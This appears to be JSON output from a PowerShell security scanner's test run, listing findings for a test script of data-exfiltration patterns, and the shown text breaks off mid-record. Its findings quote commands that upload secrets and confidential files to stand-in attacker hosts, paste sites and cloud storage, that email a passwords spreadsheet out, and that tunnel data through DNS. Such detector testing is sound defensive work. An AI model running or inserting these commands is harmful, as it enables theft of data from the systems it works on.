{
  "Timestamp": "2025-10-25T17:22:25.5429484Z",
  "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
  "FileHash": "7FC4BC23F4F9FEAD53F6DBA8248B4E242D13D1D5AFC771E7FF8C6E132B35CAA8",
  "Result": {
    "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
    "Violations": [
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 17,
        "Code": "Invoke-WebRequest -Uri \"http://exfil.example.com/upload\" -Method POST -Body $data",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP URI in -Uri parameter. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 17,
        "Code": "Invoke-WebRequest -Uri \"http://exfil.example.com/upload\" -Method POST -Body $data",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 21,
        "Code": "Invoke-RestMethod -Uri \"http://attacker.com/collect\" -Method Post -Body ($secrets | ConvertTo-Json)",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP URI in -Uri parameter. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 21,
        "Code": "Invoke-RestMethod -Uri \"http://attacker.com/collect\" -Method Post -Body ($secrets | ConvertTo-Json)",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 24,
        "Code": "Invoke-WebRequest -Uri \"http://evil.com/data\" -Method Put -InFile \"C:\\Data\\confidential.xlsx\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP URI in -Uri parameter. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 24,
        "Code": "Invoke-WebRequest -Uri \"http://evil.com/data\" -Method Put -InFile \"C:\\Data\\confidential.xlsx\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 95,
        "Code": "Invoke-WebRequest -Uri \"http://attacker.com/upload\" -Method POST -InFile \"C:\\Temp\\exfil.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP URI in -Uri parameter. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 95,
        "Code": "Invoke-WebRequest -Uri \"http://attacker.com/upload\" -Method POST -InFile \"C:\\Temp\\exfil.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 99,
        "Code": "Invoke-RestMethod -Uri \"http://exfil.com/collect\" -Method POST -InFile \"C:\\Temp\\data.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP URI in -Uri parameter. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 99,
        "Code": "Invoke-RestMethod -Uri \"http://exfil.com/collect\" -Method POST -InFile \"C:\\Temp\\data.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 17,
        "Code": "\"http://exfil.example.com/upload\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 21,
        "Code": "\"http://attacker.com/collect\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 24,
        "Code": "\"http://evil.com/data\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 28,
        "Code": "\"https://pastebin.com/api/api_post.php\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 38,
        "Code": "\"https://api.github.com/gists\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 41,
        "Code": "\"https://hastebin.com/documents\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 48,
        "Code": "\"https://raw.githubusercontent.com/attacker/repo/main/exfil.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 52,
        "Code": "\"https://content.dropboxapi.com/2/files/upload\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 56,
        "Code": "\"https://www.googleapis.com/upload/drive/v3/files\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 60,
        "Code": "\"https://graph.microsoft.com/v1.0/me/drive/root:/file.txt:/content\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 64,
        "Code": "\"https://mybucket.s3.amazonaws.com/exfil.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 68,
        "Code": "\"https://myaccount.blob.core.windows.net/container/data.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 95,
        "Code": "\"http://attacker.com/upload\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 99,
        "Code": "\"http://exfil.com/collect\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 112,
        "Code": "\"https://upload.box.com/api/2.0/files/content\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 116,
        "Code": "\"https://www.mediafire.com/api/1.5/upload/simple.php\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 125,
        "Code": "\"https://storage.googleapis.com/mybucket/sensitive.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Using deprecated System.Net.WebClient. Use Invoke-RestMethod or Invoke-WebRequest instead.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 87,
        "Code": "New-Object System.Net.WebClient",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Send-MailMessage is deprecated and has security issues. Use MailKit or Microsoft.Graph instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 79,
        "Code": "Send-MailMessage -To \"attacker@evil.com\" -From \"victim@company.com\" -Subject \"Data\" -Attachments \"C:\\Sensitive\\passwords.xlsx\" -SmtpServer smtp.company.com",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Send-MailMessage is deprecated and has security issues. Use MailKit or Microsoft.Graph instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 83,
        "Code": "Send-MailMessage -To \"exfil@attacker.com\" -Body $body -Subject \"Export\" -SmtpServer smtp.company.com",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "DNS query in loop detected. This pattern is used for DNS tunneling to exfiltrate data. MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: DNS).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 7,
        "Code": "Resolve-DnsName \"$chunk.evil.example.com\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "DNS query in loop detected. This pattern is used for DNS tunneling to exfiltrate data. MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: DNS).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 121,
        "Code": "Resolve-DnsName \"encoded-data-$chunk.attacker.com\" -DnsOnly",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 17,
        "Code": "Invoke-WebRequest -Uri \"http://exfil.example.com/upload\" -Method POST -Body $data",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 21,
        "Code": "Invoke-RestMethod -Uri \"http://attacker.com/collect\" -Method Post -Body ($secrets | ConvertTo-Json)",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 24,
        "Code": "Invoke-WebRequest -Uri \"http://evil.com/data\" -Method Put -InFile \"C:\\Data\\confidential.xlsx\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 28,
        "Code": "Invoke-RestMethod -Uri \"https://pastebin.com/api/api_post.php\" -Method POST -Body @{api_paste_code=$content}",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 38,
        "Code": "Invoke-RestMethod -Uri \"https://api.github.com/gists\" -Method POST -Body ($gistData | ConvertTo-Json)",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 41,
        "Code": "Invoke-WebRequest -Uri \"https://hastebin.com/documents\" -Method POST -Body $data",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 45,
        "Code": "Invoke-RestMethod -Uri $url -Method POST -Body $content",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 49,
        "Code": "Invoke-WebRequest -Uri $uploadUrl -Method POST -Body $data",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 53,
        "Code": "Invoke-RestMethod -Uri $dropboxUrl -Method POST -Body $fileBytes -Headers @{Authorization=\"Bearer token\"}",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 57,
        "Code": "Invoke-WebRequest -Uri $driveUrl -Method POST -InFile \"C:\\Data\\sensitive.docx\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 61,
        "Code": "Invoke-RestMethod -Uri $oneDriveUrl -Method Put -Body $content",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 65,
        "Code": "Invoke-WebRequest -Uri $s3Url -Method PUT -InFile \"C:\\Temp\\data.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 69,
        "Code": "Invoke-RestMethod -Uri $blobUrl -Method PUT -Body $data",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 72,
        "Code": "Invoke-WebRequest -Uri \"https://transfer.sh/file.zip\" -Method PUT -InFile \"C:\\Data\\archive.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 76,
        "Code": "Invoke-WebRequest -Uri $megaUrl -Method POST -Body $content",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 95,
        "Code": "Invoke-WebRequest -Uri \"http://attacker.com/upload\" -Method POST -InFile \"C:\\Temp\\exfil.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 99,
        "Code": "Invoke-RestMethod -Uri \"http://exfil.com/collect\" -Method POST -InFile \"C:\\Temp\\data.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 113,
        "Code": "Invoke-WebRequest -Uri $boxUrl -Method POST -Body $data",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 117,
        "Code": "Invoke-RestMethod -Uri $mediafireUrl -Method POST -InFile \"C:\\Data\\file.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 126,
        "Code": "Invoke-WebRequest -Uri $gcsUrl -Method PUT -Body $content",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "HTTP POST with data detected. Review destination and content for potential data exfiltration. MITRE ATT&CK: T1048.003 (Exfiltration Over Web Service), T1041 (Exfiltration Over C2 Channel).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 130,
        "Code": "Invoke-RestMethod -Uri $privatebinUrl -Method POST -Body @{paste=$data}",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Code sharing/paste service detected: https://pastebin.com/api/api_post.php. This is commonly used for data exfiltration. MITRE ATT&CK: T1567.001 (Exfiltration to Code Repository).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 28,
        "Code": "\"https://pastebin.com/api/api_post.php\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Code sharing/paste service detected: https://hastebin.com/documents. This is commonly used for data exfiltration. MITRE ATT&CK: T1567.001 (Exfiltration to Code Repository).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 41,
        "Code": "\"https://hastebin.com/documents\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Code sharing/paste service detected: https://paste.ee/api. This is commonly used for data exfiltration. MITRE ATT&CK: T1567.001 (Exfiltration to Code Repository).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 44,
        "Code": "\"https://paste.ee/api\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Code sharing/paste service detected: https://raw.githubusercontent.com/attacker/repo/main/exfil.txt. This is commonly used for data exfiltration. MITRE ATT&CK: T1567.001 (Exfiltration to Code Repository).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 48,
        "Code": "\"https://raw.githubusercontent.com/attacker/repo/main/exfil.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Code sharing/paste service detected: https://privatebin.net. This is commonly used for data exfiltration. MITRE ATT&CK: T1567.001 (Exfiltration to Code Repository).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 129,
        "Code": "\"https://privatebin.net\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://mybucket.s3.amazonaws.com/exfil.zip. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 64,
        "Code": "\"https://mybucket.s3.amazonaws.com/exfil.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://myaccount.blob.core.windows.net/container/data.txt. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 68,
        "Code": "\"https://myaccount.blob.core.windows.net/container/data.txt\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://transfer.sh/file.zip. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 72,
        "Code": "\"https://transfer.sh/file.zip\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/data-exfiltration.ps1",
        "RuleId": "DataExfiltrationDetection",
        "Metadata": {}
      },
      {
        "Name": "DataExfiltrationDetection",
        "Message": "Cloud storage service detected: https://mega.nz/upload. Review for potential data exfiltration. MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage).",
        "Description": null,
